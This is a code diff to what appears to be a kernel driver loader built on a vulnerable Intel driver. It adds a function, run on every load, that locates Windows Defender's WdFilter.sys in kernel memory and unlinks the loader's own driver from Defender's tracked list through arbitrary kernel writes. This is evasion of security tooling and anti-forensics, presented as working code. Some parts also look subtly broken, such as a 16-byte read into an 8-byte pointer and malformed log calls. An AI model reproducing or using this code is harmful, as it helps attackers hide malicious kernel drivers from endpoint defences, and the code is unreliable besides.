@@ -102,6 +102,12 @@ HANDLE intel_driver::Load() {
 		return INVALID_HANDLE_VALUE;
 	}
 
+	if (!intel_driver::ClearWdFilterDriverList(result)) {
+		Log("[!] Failed to ClearWdFilterDriverList");
+		intel_driver::Unload(result);
+		return INVALID_HANDLE_VALUE;
+	}
+
 	return result;
 }
 
@@ -628,6 +634,62 @@ bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle) {
 	Log("[+] MmUnloadedDrivers Cleaned: %x", unloadedName);
 
 	delete[] unloadedName;
+
+	return true;
+}
+
+bool intel_driver::ClearWdFilterDriverList(HANDLE device_handle) {
+	auto WdFilter = utils::GetKernelModuleAddress("WdFilter.sys");
+	if (!WdFilter) {
+		Log(L"[!] Failed to find WdFilter.sys" << std::endl);
+		//driver::Unload(device_handle);
+		return false;
+	}
+
+	auto g_table = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", (char*)"xxx????xx");
+	if (!g_table) {
+		Log(L"[!] Failed to find g_table" << std::endl);
+		//driver::Unload(device_handle);
+		return false;
+	}
+
+	g_table = (uintptr_t)ResolveRelativeAddress(device_handle, (PVOID)g_table, 3, 7);
+	uintptr_t g_table_Head = g_table - 0x8;
+
+	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY*
+	{
+		LIST_ENTRY* Entry;
+		if (!ReadMemory(device_handle, Address, &Entry, sizeof(LIST_ENTRY))) return 0;
+		return Entry;
+	};
+
+	for (LIST_ENTRY* Entry = ReadListEntry(g_table_Head); Entry
+		!= ReadListEntry((g_table_Head)+(offsetof(struct _LIST_ENTRY, Blink)));
+		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
+	{
+		UNICODE_STRING Unicode_String;
+		if (ReadMemory(device_handle, (uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING)))
+		{
+			wchar_t* ImageName = new wchar_t[(ULONG64)Unicode_String.Length / 2ULL + 1ULL];
+			memset(ImageName, 0, Unicode_String.Length + sizeof(wchar_t));
+
+			if (ReadMemory(device_handle, (uintptr_t)Unicode_String.Buffer, ImageName, Unicode_String.Length)) {
+
+				if (wcsstr(ImageName, intel_driver::GetDriverNameW().c_str()))
+				{
+					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
+					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));
+					WriteMemory(device_handle, uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), NextEntry, sizeof(LIST_ENTRY));
+					WriteMemory(device_handle, uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), PrevEntry, sizeof(LIST_ENTRY));
+
+					delete[] ImageName;
+					break;
+				}
+			}
+
+			delete[] ImageName;
+		}
+	}
 
 	return true;
 }
